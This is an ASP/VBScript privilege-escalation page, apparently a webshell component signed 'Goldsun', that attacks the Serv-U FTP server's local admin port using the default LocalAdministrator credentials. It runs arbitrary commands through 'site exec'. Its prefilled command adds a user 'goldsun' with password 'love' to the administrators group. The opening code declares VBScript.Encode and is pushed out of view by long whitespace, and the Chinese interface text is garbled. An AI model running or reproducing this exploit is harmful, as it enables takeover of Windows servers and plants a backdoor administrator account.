<%@ LANGUAGE = VBScript.Encode %>
<% 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
%>
<form method="post" name="goldsun">
<input name="u" type="hidden" id="u" value="<%=user%>"></td>
<input name="p" type="hidden" id="p" value="<%=pass%>"></td>
<input name="port" type="hidden" id="port" value="<%=port%>"></td>
<input name="c" type="hidden" id="c" value="<%=cmd%>" size="50">
<input name="f" type="hidden" id="f" value="<%=f%>" size="50">
<input name="action" type="hidden" id="action" value="2"></form>
<script language="javascript">
document.write('<center>�������� 127.0.0.1:<%=port%>,ʹ���û���: <%=user%>,���<%=pass%>...<center>');
setTimeout("document.all.goldsun.submit();",4000);
</script>
<%
case 2
    set b=Server.CreateObject("Microsoft.XMLHTTP")
    b.open "GET", "http://127.0.0.1:" & ftpport & "/goldsun/upadmin/s2", True, "", ""
    b.send "User go" & vbCrLf & "pass od" & vbCrLf & "site exec " & cmd & vbCrLf & quit
   set session("b")=b
%>
<form method="post" name="goldsun">
<input name="u" type="hidden" id="u" value="<%=user%>"></td>
<input name="p" type="hidden" id="p" value="<%=pass%>"></td>
<input name="port" type="hidden" id="port" value="<%=port%>"></td>
<input name="c" type="hidden" id="c" value="<%=cmd%>" size="50">
<input name="f" type="hidden" id="f" value="<%=f%>" size="50">
<input name="action" type="hidden" id="action" value="3"></form>
<script language="javascript">
document.write('<center>��������Ȩ��,��ȴ�...,<center>');
setTimeout("document.all.goldsun.submit();",4000);
</script>
<%
case 3
    set c=Server.CreateObject("Microsoft.XMLHTTP")
    c.open "GET", "http://127.0.0.1:" & port & "/goldsun/upadmin/s3", True, "", ""
    c.send loginuser & loginpass & mt & deldomain & quit
    set session("c")=c
%>
<center>��Ȩ���,��ִ�������<br><font color=red><%=cmd%></font><br><br>
<input type=button value=" ���ؼ��� " onClick="location.href='<%=gname()%>';">
</center>

<%
case else
on error resume next
    set a=session("a")
    set b=session("b")
    set c=session("c")
    a.abort
    Set a = Nothing
    b.abort
    Set b = Nothing
    c.abort
    Set c = Nothing
%>
<center><form method="post" name="goldsun">
<table width="494" height="163" border="1" cellpadding="0" cellspacing="1" bordercolor="#666666">
<tr align="center" valign="middle">
    <td colspan="2">Serv-U ����Ȩ�� ASP�� Goldsun[at]84823714</td>
</tr>
<tr align="center" valign="middle">
    <td width="100">�û���:</td>
    <td width="379"><input name="u" type="text" id="u" value="LocalAdministrator"></td>
</tr>
<tr align="center" valign="middle">
    <td>�ڡ��</td>
    <td><input name="p" type="text" id="p" value=">
</tr>
<tr align="center" valign="middle">
    <td>�ˡ��ڣ�</td>
    <td><input name="port" type="text" id="port" value="43958"></td>
</tr>
<tr align="center" valign="middle">
    <td>ϵͳ·����</td>
    <td><input name="f" type="text" id="f" value="<%=f%>" size="8"></td>
</tr>
<tr align="center" valign="middle">
    <td>�����</td>
    <td><input name="c" type="text" id="c" value="cmd /c net user goldsun love /add & net localgroup administrators goldsun /add" size="50"></td>
</tr>

<tr align="center" valign="middle">
    <td colspan="2"><input type="submit" name="Submit" value="�ύ">��
      <input type="reset" name="Submit2" value="����">
      <input name="action" type="hidden" id="action" value="1"></td>
</tr>
</table></form></center>
<% end select
function Gpath()
on error resume next
    err.clear
    set f=Server.CreateObject("Scripting.FileSystemObject")
    if err.number>0 then
gpath="c:"
        exit function
    end if
gpath=f.GetSpecialFolder(0)
gpath=lcase(left(gpath,2))
set f=nothing
end function
Function GName() 
If request.servervariables("SERVER_PORT")="80" Then 
GName="http://" & request.servervariables("server_name")&lcase(request.servervariables("script_name")) 
Else 
GName="http://" & request.servervariables("server_name")&":"&request.servervariables("SERVER_PORT")&lcase(request.servervariables("script_name")) 
End If 
End Function 
%>